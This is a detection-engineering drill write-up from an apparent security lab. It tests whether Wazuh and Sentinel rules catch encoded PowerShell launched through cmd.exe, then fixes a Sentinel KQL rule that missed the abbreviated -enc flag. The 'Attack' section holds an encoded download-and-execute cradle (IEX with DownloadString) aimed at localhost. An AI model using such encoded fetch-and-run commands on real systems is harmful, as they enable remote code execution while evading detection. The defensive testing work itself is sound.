# Drill 2 — Suspicious Encoded PowerShell (via `cmd.exe` wrapper)

## Purpose

Re-run the encoded-PowerShell detection with the payload wrapped through `cmd.exe /c` instead of invoked directly — testing whether the detection generalizes across what launches PowerShell, or whether it's narrowly tied to one specific process tree.

## Attack

```cmd
cmd /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEALwB0AGUAcwB0AC4AcABzADEAJwApAA==
```

Launched from a Command Prompt on WIN11-SOC-Endpoint (not PowerShell directly), decoding to a harmless localhost-targeted test payload.

## Wazuh — Passed Immediately

Rule 100001 fired without modification. Its underlying regex already handled the `-enc` abbreviation and made no assumption about parent process, so wrapping through `cmd.exe` changed nothing about detection.

## Sentinel — Real False Negative Found

**First run: no incident created.** Investigation traced the cause to the rule's KQL:

```kql
| where RenderedDescription has "EncodedCommand"
```

This matches only the **literal string `"EncodedCommand"`**. But the command used the abbreviated flag `-enc` — a valid, unambiguous PowerShell shorthand (`-e`, `-en`, `-enc`, up through `-EncodedCommand` are all accepted) — and Sysmon logs the command line verbatim as typed, not resolved to its full flag name. The literal string `"EncodedCommand"` never appeared in the log, so the rule silently missed a real, known evasion pattern: attackers routinely use abbreviated flags specifically because naive detections hardcode the full name.

## Fix

```kql
| where RenderedDescription matches regex @"(?i)-e[a-z]*\s+[A-Za-z0-9+/=]{20,}"
| extend EncodedPayload = extract(@"(?i)-e[a-z]*\s+([A-Za-z0-9+/=]{20,})", 1, RenderedDescription)
```

`-e[a-z]*` matches any valid abbreviation from `-e` through `-encodedcommand`, case-insensitive, in one pattern. Deployed via Azure REST API through Cloud Shell — pulled the existing rule JSON, stripped the read-only `lastModifiedUtc` field (`jq 'del(.properties.lastModifiedUtc)'`), injected the corrected query, PUT it back.

## Live Validation of the Fix

| Event | Time (UTC) |
|---|---|
| Encoded PowerShell re-run (post-fix) | ~12:1X |
| Sentinel Incident 26 created | 12:22:31.836 |

Re-running the identical attack after deployment produced a real incident — the fix confirmed working end-to-end, not just validated in isolation.

## Why This Finding Matters

This is a stronger result than a clean pass would have been: it demonstrates the actual job of detection engineering — stress-test a rule with a realistic evasion variant, find where it silently fails, diagnose the precise root cause, patch it via infrastructure-as-code, and prove the patch closes the gap. A rule that "just worked" wouldn't have shown any of that.
